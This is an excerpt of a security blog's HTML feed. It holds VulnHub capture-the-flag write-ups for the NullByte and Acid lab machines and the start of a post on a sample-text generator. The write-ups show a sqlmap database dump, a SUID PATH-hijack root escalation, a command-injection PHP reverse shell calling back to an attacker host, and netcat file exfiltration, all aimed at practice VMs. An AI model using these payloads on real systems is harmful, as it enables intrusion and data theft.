&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;INFO&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;fetched&lt;/span&gt; &lt;span class="nt"&gt;data&lt;/span&gt; &lt;span class="nt"&gt;logged&lt;/span&gt; &lt;span class="nt"&gt;to&lt;/span&gt; &lt;span class="nt"&gt;text&lt;/span&gt; &lt;span class="nt"&gt;files&lt;/span&gt; &lt;span class="nt"&gt;under&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/home/maggick/.sqlmap/output/192.168.0.20&amp;#39;&lt;/span&gt;

&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;shutting&lt;/span&gt; &lt;span class="nt"&gt;down&lt;/span&gt; &lt;span class="nt"&gt;at&lt;/span&gt; &lt;span class="nt"&gt;15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;23&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;python2 sqlmap.py -u 'http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plo' --current-db&lt;/code&gt;
got us the name of the current databse: &lt;strong&gt;seth&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python2 sqlmap.py -u 'http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plo' -D seth --tables&lt;/code&gt;
got us the list of the tables in the database &lt;strong&gt;seth&lt;/strong&gt;. There is only one table : &lt;strong&gt;users&lt;/strong&gt;. Let us drop it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$python2 sqlmap.py -u &amp;#39;http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plop&amp;#39; -D seth --dump
+----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | &amp;amp;lt;blank&amp;amp;gt;    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It seems that ramses pass(word) is base64 encoded. After decoding, we got:
&lt;strong&gt;c6d6bd7ebf806f43c76acc3681703b81&lt;/strong&gt; which looks like a md5 hash. A simple
google search give us the associated password: &lt;strong&gt;omega&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;We have a username and a password. We have also seen a ssh port at the nmap
stage.&lt;/p&gt;
&lt;h2&gt;Shell exploitation&lt;/h2&gt;
&lt;h3&gt;ssh&lt;/h3&gt;
&lt;p&gt;We try to connect to the non standard ssh port as ramses:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ssh 192.168.0.20 -p 777 -lramses
ramses@192.168.0.20&amp;#39;s password:
omega
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And it works.&lt;/p&gt;
&lt;h3&gt;Privilege elevation&lt;/h3&gt;
&lt;p&gt;We got a shell as a user now we need privilege escalation to become root. After
trying &lt;code&gt;sudo su&lt;/code&gt; we look at the &lt;code&gt;bash_history&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ramses@NullByte:~$ cat .bash_history
sudo -s
su eric
exit
ls
clear
cd /var/www
cd backup/
ls
./procwatch
clear
sudo -s
cd /
ls
exit
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let see the &lt;code&gt;/var/www/backup/&lt;/code&gt; folder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ramses@NullByte:/var/www/backup$ ls -l
total 12
-rwsr-xr-x 1 root root 4932 Aug  2 01:29 procwatch
-rw-r--r-- 1 root root   28 Aug  2 01:36 readme.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Interesting, we read the readme.txt file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ramses@NullByte:/var/www/backup$ cat readme.txt
I have to fix this mess...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We execute &lt;code&gt;procwatch&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;ramses@NullByte:/var/www/backup$ ./procwatch
  PID TTY          TIME CMD
 1785 pts/0    00:00:00 procwatch
 1786 pts/0    00:00:00 sh
 1787 pts/0    00:00:00 ps&lt;/p&gt;
&lt;p&gt;Seems like a ps, probably executing the command itself. Moreover it is own by root
with the &lt;a href="https://en.wikipedia.org/wiki/Setuid"&gt;suid&lt;/a&gt; set (the s in the &lt;code&gt;ls -l&lt;/code&gt;),
meaning we execute this program with root privileges.&lt;/p&gt;
&lt;p&gt;One classic vulnerability when a program executes another one is to use the PATH
environment variable to execute a command of our choice instead of the command
wanted by the program.&lt;/p&gt;
&lt;p&gt;First of all we create a file with the command we want to execute and name it &lt;code&gt;ps&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ramses@NullByte:/var/www/backup$ echo /bin/sh &amp;amp;gt; ~/ps
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We give the execution right to this file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ramses@NullByte:/var/www/backup$ chmod +x ~/ps
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We add the directory where we created this file to our PATH:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ramses@NullByte:/var/www/backup$ export PATH=~/:$PATH
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We execute the original program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ramses@NullByte:/var/www/backup$ ./procwatch
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Magic happened, we got a root shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# whoami
root
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we just need to search the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# ls /root
proof.txt
# cat /root/proof.txt
adf11c7a9e6523e630aaf3b9b7acb51d

It seems that you have pwned the box, congrats.
Now you done that I wanna talk with you. Write a walk &amp;amp;amp; mail at
xly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com


USE THIS PGP PUBLIC KEY

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: BCPG C# v1.6.1.0

mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
RryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
Gms=
=PiAQ
-----END PGP PUBLIC KEY BLOCK-----
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;This box was fun. The url were unpredictable and dirbuster doesn't spoil all the
fun for us. Thank to &lt;a href="https://twitter.com/@ly0nx"&gt;@ly0nx&lt;/a&gt; for this box and
&lt;a href="http://vulnhub.com"&gt;vulnhub&lt;/a&gt; as always.&lt;/p&gt;</content><category term="security"></category><category term="vulnhub"></category><category term="challenge"></category></entry><entry><title>Vulnhub - Acid</title><link href="https://matthieukeller.com/2015/09/vulnhub-acid.html" rel="alternate"></link><published>2015-09-11T11:30:00+02:00</published><updated>2015-09-11T11:30:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2015-09-11:/2015/09/vulnhub-acid.html</id><summary type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2015.09/bg.jpg" alt="acid" width="262"&gt;&lt;/p&gt;
&lt;p&gt;Since &lt;a href="http://matthieukeller.com/2015/06/vulnhub-fart-knocker.html"&gt;Fart knocker&lt;/a&gt;
in June I have worked on an other vulnhub machine:
&lt;a href="https://www.vulnhub.com/entry/darknet-10,120/"&gt;darknet&lt;/a&gt;. But this one is really
hard and get me stuck. I was a bit demotivated to continue vulnhub's machines but
I got some time this week, therefore I tried the
&lt;a href="https://www.vulnhub.com/entry/acid-server,125/"&gt;Acid&lt;/a&gt; one.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2015.09/bg.jpg" alt="acid" width="262"&gt;&lt;/p&gt;
&lt;p&gt;Since &lt;a href="http://matthieukeller.com/2015/06/vulnhub-fart-knocker.html"&gt;Fart knocker&lt;/a&gt;
in June I have worked on an other vulnhub machine:
&lt;a href="https://www.vulnhub.com/entry/darknet-10,120/"&gt;darknet&lt;/a&gt;. But this one is really
hard and get me stuck. I was a bit demotivated to continue vulnhub's machines but
I got some time this week, therefore I tried the
&lt;a href="https://www.vulnhub.com/entry/acid-server,125/"&gt;Acid&lt;/a&gt; one.&lt;/p&gt;


&lt;p&gt;The goal is as usual, get root on the virtual machine. Let's go:&lt;/p&gt;
&lt;h2&gt;Host Discovery&lt;/h2&gt;
&lt;p&gt;As always, we start with host discovery:
&lt;a href="http://nmap.org"&gt;Nmap&lt;/a&gt; and &lt;a href="https://cirt.net/Nikto2"&gt;nikto&lt;/a&gt; are our friends for
this step.&lt;/p&gt;
&lt;h3&gt;nmap&lt;/h3&gt;
&lt;p&gt;We launch nmap against the virtual machine:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nmap 192.168.0.18 -p0-65535 -A -oA nmap
Starting Nmap 6.47 ( http://nmap.org ) at 2015-09-08 12:08 CEST
Stats: 0:07:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 98.89% done; ETC: 12:15 (0:00:05 remaining)
Nmap scan report for 192.168.0.18
Host is up (0.0045s latency).
Not shown: 65535 closed ports
PORT      STATE SERVICE
33447/tcp open  unknown
|_http-title: /Challenge

Service detection performed. Please report any incorrect results at
http://nmap.org/submit/ .
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We got a nice Apache web server with a simple splash screen. Notice the page
title: &lt;strong&gt;/Challenge&lt;/strong&gt;.&lt;/p&gt;
&lt;h3&gt;Nikto&lt;/h3&gt;
&lt;p&gt;I ran nikto on the target but nothing pop out.&lt;/p&gt;
&lt;h2&gt;Web exploitation&lt;/h2&gt;
&lt;h3&gt;Page source&lt;/h3&gt;
&lt;p&gt;As we come pretty empty handed, we check the page source and two interesting
things came out:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Some hexadecimal code at the end of the page: 0x643239334c6d70775a773d3d&lt;/li&gt;
&lt;li&gt;the title of the page (we can see it in the nmap scan) is /Challenge
    and there is an other web page at this address.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Hexa code&lt;/h4&gt;
&lt;p&gt;We will start with the first lead the hexadecimal code:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0x643239334c6d70775a773d3d&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We convert it to string and we got:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;?d293LmpwZw==&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We decode the base64 and we got:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;wow.jpg&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We go to the url (the /images/ is given with the background image of the first
web page):&lt;/p&gt;
&lt;p&gt;http://192.168.0.18:33447/images/wow.jpg&lt;/p&gt;
&lt;p&gt;As a result we got a nice image that reward us for our success.&lt;/p&gt;
&lt;p&gt;&lt;img alt="wow.jpg" src="/media/2015.09/wow.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Yeah it seems to be some troll :)&lt;/p&gt;
&lt;h3&gt;/Challenge&lt;/h3&gt;
&lt;p&gt;Let us dig the second lead: the page title. By adding &lt;code&gt;/Challenge&lt;/code&gt; in the URL,
we land on an authentication interface.&lt;/p&gt;
&lt;p&gt;I tried to use SQL injection but nothing. We will try
&lt;a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project"&gt;dirbuster&lt;/a&gt;
with the small dictionary (`/usr/share/dirbuster/directory-list-2.3-small.txt):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Tue Sep 08 16:54:05 CEST 2015
--------------------------------

http://192.168.0.18:33447
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/Challenge/

Dirs found with a 403 response:

/Challenge/css/
/Challenge/includes/
/Challenge/js/
/Challenge/styles/
/Challenge/less/


--------------------------------
Files found during testing:

Files found with a 200 responce:

/Challenge/index.php
/Challenge/error.php
/Challenge/includes/functions.php
/Challenge/cake.php

Files found with a 302 responce:

/Challenge/include.php
/Challenge/includes/logout.php
/Challenge/hacked.php


--------------------------------
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We got the &lt;code&gt;cake.php&lt;/code&gt; page but as we all know "The cake is a lie". We noticed
that the page title is one more time a folder: &lt;code&gt;/Magic_box&lt;/code&gt;.
When going to &lt;code&gt;/Challenge/Magic_box&lt;/code&gt; we got a 403 forbidden page. Let us fire
&lt;a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project"&gt;dirbuster&lt;/a&gt;
again:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Tue Sep 08 17:17:43 CEST 2015
--------------------------------

http://192.168.0.18:33447
--------------------------------
Directories found during testing:

Dirs found with a 403 response:

/Challenge/Magic_Box/
/Challenge/Magic_Box/proc/


--------------------------------
Files found during testing:

Files found with a 200 responce:

/Challenge/Magic_Box/low.php
/Challenge/Magic_Box/command.php

Files found with a 302 responce:

/Challenge/Magic_Box/proc/validate.php


--------------------------------
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We got some nice result mostly the &lt;code&gt;/command.php&lt;/code&gt; page.&lt;/p&gt;
&lt;h3&gt;Command execution&lt;/h3&gt;
&lt;p&gt;The page let us ping an other machine in the network. Nevertheless the page name
let us think that we can use command exploitation. If we add a &lt;code&gt;;&lt;/code&gt; in the filed
and a command it seems to works, for instance with &lt;code&gt;; ls&lt;/code&gt; we got (I use
&lt;a href="http://releases.portswigger.net/"&gt;burp&lt;/a&gt; for all my pentest, the output of the
command is in the response page):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;command.php
command.php.save
command2.php.save
command2.php.save.1
low.php
proc
tails.php
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can also read &lt;code&gt;/etc/passwd&lt;/code&gt;: there is two users on the server: acid and
saman.&lt;/p&gt;
&lt;p&gt;Let us try to get a reverse shell with that.&lt;/p&gt;
&lt;h3&gt;reverse shell&lt;/h3&gt;
&lt;p&gt;As always, a good source of information is
&lt;a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"&gt;pentest monkey&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We know the site use php so we will try the php reverse shell first:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;On the host we execute: &lt;code&gt;nc -l -p 6666&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;On the target (via the ping interface) we query:
    &lt;code&gt;; php -r '$sock=fsockopen("192.168.0.13",6666);exec("/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;It got us a shell on the machine (without tty/pty). But executing the request in the ping
interface each time we want the shell in painful, so I extract the curl command
from burp:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -i -s -k  -X &amp;#39;POST&amp;#39; \
    -H &amp;#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0&amp;#39; -H &amp;#39;DNT: 1&amp;#39; -H &amp;#39;Referer: http://192.168.0.18:33447/Challenge/Magic_Box/command.php&amp;#39; -H &amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39; \
    -b &amp;#39;sec_session_id=2cdjrm9k6khpfiilsad1kmnpj2&amp;#39; \
    --data-binary $&amp;#39;IP=%3B+php+-r+%27%24sock%3Dfsockopen%28%22192.168.0.13%22%2C6666%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27&amp;amp;amp;submit=submit&amp;#39; \
    &amp;#39;http://192.168.0.18:33447/Challenge/Magic_Box/command.php&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now that we have a shell, let us see what we can do.&lt;/p&gt;
&lt;h2&gt;Shell exploitation&lt;/h2&gt;
&lt;p&gt;First we discover what is at our disposal, mostly in the &lt;code&gt;/home/&lt;/code&gt;
(&lt;code&gt;bash_history&lt;/code&gt;). In the &lt;code&gt;/home/acid/&lt;/code&gt; there is something interesting but
empty:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ls -la /home/acid/.su*
-rw-r--r-- 1 acid acid 0 Jul 31 17:27 /home/acid/.sudo_as_admin_successful
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let us see what else we got on the machine:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ls /
bin
boot
cdrom
dev
etc
home
initrd.img
lib
lost+found
media
mnt
opt
proc
root
run
s.bin
sbin
srv
sys
tmp
usr
var
vmlinuz
$ ls /opt/
$ ls /media
acid
floppy
floppy0
$ ls /s.bin
investigate.php
$ cat /s.bin/investigate.php
&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;lt&lt;span class="p"&gt;;&lt;/span&gt;?php
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Now you have to behave like an investigator to catch the culprit\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
?
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;That is interesting the php file in &lt;code&gt;/s.bin/&lt;/code&gt; clearly tell us to investigate.
But what we need know is a privilege escalation ti gain root access.&lt;/p&gt;
&lt;h3&gt;Privilege escalation&lt;/h3&gt;
&lt;p&gt;I tried the overlayfs exploit (the same as with
&lt;a href="http://matthieukeller.com/2015/06/vulnhub-fart-knocker.html"&gt;Fart knocker&lt;/a&gt;)
without success:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I compiled the exploit on an other 32 bits virtual machine;&lt;/li&gt;
&lt;li&gt;I transfered it to the shell via netcat;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;And it failed:&lt;/p&gt;
&lt;p&gt;$ ./ofs.bin  : 4:
spawning threads
mount #1
mount #2
child threads done
exploit failed&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;But we were given an hint.&lt;/p&gt;
&lt;h3&gt;More investigations&lt;/h3&gt;
&lt;p&gt;The &lt;a href="http://pwnwiki.io/#!privesc/linux/index.md"&gt;pwnwiki.io&lt;/a&gt; wiki is always a
good source of information. So with more investigation we look at bash_history,
search for &lt;code&gt;*txt*&lt;/code&gt; files, an so on. Then &lt;code&gt;*pcap*&lt;/code&gt; files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ find / -name *pcap* &lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;gt&lt;span class="p"&gt;;&lt;/span&gt;/dev/null
/lib/modules/3.19.0-15-generic/kernel/drivers/rtc/rtc-pcap.ko
/lib/modules/3.19.0-15-generic/kernel/drivers/input/misc/pcap_keys.ko
/lib/modules/3.19.0-15-generic/kernel/drivers/input/touchscreen/pcap_ts.ko
/lib/modules/3.19.0-15-generic/kernel/drivers/regulator/pcap-regulator.ko
/sbin/raw_vs_isi/hint.pcapng
/sbin/getpcaps
/sys/bus/spi/drivers/ezx-pcap
/usr/share/doc/libpcap0.8
/usr/share/mime/application/vnd.tcpdump.pcap.xml
/usr/share/man/man7/pcap-filter.7.gz
/usr/share/man/man1/getpcaps.1.gz
/usr/lib/i386-linux-gnu/libpcap.so.1.6.2
/usr/lib/i386-linux-gnu/libpcap.so.0.8
/usr/src/linux-headers-3.19.0-15/include/linux/mfd/ezx-pcap.h
/usr/src/linux-headers-3.19.0-15-generic/include/config/ezx/pcap.h
/usr/src/linux-headers-3.19.0-15-generic/include/config/touchscreen/pcap.h
/usr/src/linux-headers-3.19.0-15-generic/include/config/rtc/drv/pcap.h
/usr/src/linux-headers-3.19.0-15-generic/include/config/input/pcap.h
/usr/src/linux-headers-3.19.0-15-generic/include/config/regulator/pcap.h
/var/lib/dpkg/info/libpcap0.8:i386.postinst
/var/lib/dpkg/info/libpcap0.8:i386.shlibs
/var/lib/dpkg/info/libpcap0.8:i386.postrm
/var/lib/dpkg/info/libpcap0.8:i386.md5sums
/var/lib/dpkg/info/libpcap0.8:i386.symbols
/var/lib/dpkg/info/libpcap0.8:i386.list
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yes &lt;code&gt;/sbin/raw_vs_isi/hint.pcapng&lt;/code&gt;!&lt;/p&gt;
&lt;h3&gt;pcap&lt;/h3&gt;
&lt;p&gt;We transfer the file with netcat:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;On our attack machine: &lt;code&gt;nc -lp 1234 &amp;gt; pcap&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;On the server: &lt;code&gt;nc 192.168.0.13 1234 &amp;lt; /sbin/raw_vs_isi/hint.pcapng&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We open the pcap file with &lt;a href="https://www.wireshark.org/"&gt;wireshark&lt;/a&gt;. There is a
lot of information in this file, over 6 000 trams.
On the 6 212 we notice some sort of text. By following the TCP stream (wireshark
function) we discover what seems to be a chat exchange:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;heya&lt;/p&gt;
&lt;p&gt;hello
What was the name of the Culprit ???&lt;/p&gt;
&lt;p&gt;saman and now a days he's known by the alias of 1337hax0r&lt;/p&gt;
&lt;p&gt;oh...Fuck....Great...Now, we gonna Catch Him Soon :D&lt;/p&gt;
&lt;p&gt;Yes .. We have to !! The mad bomber is on a rage&lt;/p&gt;
&lt;p&gt;Ohk...cya&lt;/p&gt;
&lt;p&gt;Over and Out&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Great, what does it means? We know that saman is one of the user on the machine.
Maybe we got some hints about it password or something like that.&lt;/p&gt;
&lt;h3&gt;interactive shell&lt;/h3&gt;
&lt;p&gt;In order to execute a su, we need a interactive shell (with
&lt;a href="https://en.wikipedia.org/wiki/Pseudoterminal"&gt;pty/tty&lt;/a&gt;).
Once more &lt;a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty"&gt;pentest monkey&lt;/a&gt;
will help us:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As &lt;code&gt;/bin/sh&lt;/code&gt; is a symlink to dash, we directly use bash:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We now need to try to connect as saman.&lt;/p&gt;
&lt;h2&gt;Saman&lt;/h2&gt;
&lt;p&gt;With our beautiful shell we jut have to &lt;code&gt;su saman&lt;/code&gt; to try to connect as saman:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;www-data@acid:/var/www/html/Challenge/Magic_Box$ su saman
su saman
Password: 1337hax0r
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It works! Let us try &lt;code&gt;sudo su&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;saman@acid:/var/www/html/Challenge/Magic_Box$ sudo su
sudo su
[sudo] password for saman: 1337hax0r
root@acid:/var/www/html/Challenge/Magic_Box# cat /root/flag.txt
cat /root/flag.txt


Dear Hax0r,


You have successfully completed the challenge.

I  hope you like it.


FLAG NAME: &amp;quot;Acid@Makke@Hax0r
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;It was a nice box to root but as I read the other write up it seems that my way
was not the one expected.
Nevertheless, thank to &lt;a href="https://twitter.com/m_avinash143"&gt;Avinash Kumar Thapa&lt;/a&gt;
for the box and &lt;a href="https://twitter.com/VulnHub"&gt;vulnhub&lt;/a&gt;.&lt;/p&gt;</content><category term="security"></category><category term="vulnhub"></category></entry><entry><title>Localipsum, a sample text generator</title><link href="https://matthieukeller.com/2015/08/localipsum-a-sample-text-generator.html" rel="alternate"></link><published>2015-08-23T22:30:00+02:00</published><updated>2015-08-23T22:30:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2015-08-23:/2015/08/localipsum-a-sample-text-generator.html</id><summary type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2015.08/localipsum.png" alt="Localipsum" width="262"&gt;&lt;/p&gt;
&lt;p&gt;Localipsum is a simple python program that aim to generate sample text for
designers and developers as the well known
&lt;a href="http://lipsum.co.uk/"&gt;Lorem Ipsum website&lt;/a&gt;. The main difference is that it use
your own dictionaries on your computer.
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2015.08/localipsum.png" alt="Localipsum" width="262"&gt;&lt;/p&gt;
&lt;p&gt;Localipsum is a simple python program that aim to generate sample text for
designers and developers as the well known
&lt;a href="http://lipsum.co.uk/"&gt;Lorem Ipsum website&lt;/a&gt;. The main difference is that it use
your own dictionaries on your computer.
&lt;/p&gt;
&lt;p&gt;I worked on this program at the beginning of the year on the basis of a fun idea:
use my own dictionaries to generate sample text.
This was a quick program to write but the vim's dictionaries were (and still
are) a problem (more on the dedicated section).&lt;/p&gt;
&lt;p&gt;I have stopped to work on this program as it fulfil my current need.&lt;/p&gt;
&lt;p&gt;The program is available on github under public license:
&lt;a href="http://github.com/maggick/localipsum"&gt;github.com/maggick/localipsum&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Usage&lt;/h2&gt;
&lt;p&gt;The documentation is display with the --help, -h option:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./localipsum.py -h
usage: localipsum.py [-h] [--paragraphs] [--sentences] [--words] [--lorem] integer

Localispum is a simple program providing sample text generating from your own
dictionaries
...
&lt;/pre&gt;&lt;/div&gt;


